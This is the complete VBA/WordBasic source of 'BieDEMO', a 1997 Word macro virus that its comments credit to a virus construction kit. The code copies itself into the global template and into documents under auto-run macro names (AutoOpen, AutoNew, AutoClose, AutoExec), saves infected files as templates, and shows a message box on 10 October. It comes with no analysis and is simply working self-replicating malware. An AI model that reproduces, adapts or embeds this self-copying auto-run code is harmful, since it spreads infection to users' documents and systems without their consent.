   Attribute VB_Name = "BieDEMO"

   Public Sub MAIN()
   Dim i
   Dim t
   Dim fn$
   Dim fnm$
   Dim ii
   Dim tt
   Rem Bie's Word Macro Virus Hamburger Ver.beta
   Rem This Macro Virus Made from Bie's WMVH
   Rem Bie's E-Mail: bie111@hotmail.com
   Rem 2/09/1997
   On Error GoTo -1: On Error GoTo exit_
   If WordBasic.CountMacros(0) > 0 Then
   For i = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](i, 0) = "BieDEMO" Then t = 1
   Next i
   End If
   fn$ = WordBasic.[FileName$]()
   fnm$ = fn$ + ":AutoOpen"
   If t <> 1 Then
   WordBasic.MacroCopy fn$ + ":BieDEMO", "BieDEMO", 1
   WordBasic.MacroCopy fnm$, "AutoOpen", 1
   WordBasic.MacroCopy fnm$, "AutoNew", 1
   WordBasic.MacroCopy fnm$, "AutoClose", 1
   WordBasic.MacroCopy fnm$, "AutoExec", 1
   End If
   If WordBasic.CountMacros(1) > 0 Then
   For ii = 1 To WordBasic.CountMacros(1)
   If WordBasic.[MacroName$](ii, 1) = "BieDEMO" Then tt = 1
   Next ii
   End If
   If tt <> 1 Then
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "BieDEMO", fn$ + ":BieDEMO", 1
   WordBasic.MacroCopy "AutoOpen", fnm$, 1
   End If
   If WordBasic.Day(WordBasic.Now()) = 10 And WordBasic.Month(WordBasic.Now()) = 10 Then GoTo non
   GoTo exit_


   non:
   WordBasic.MsgBox "This is a Demo of Bie's WMVH", "BieDEMO Macro Virus by WMVH"
   exit_:
   End Sub
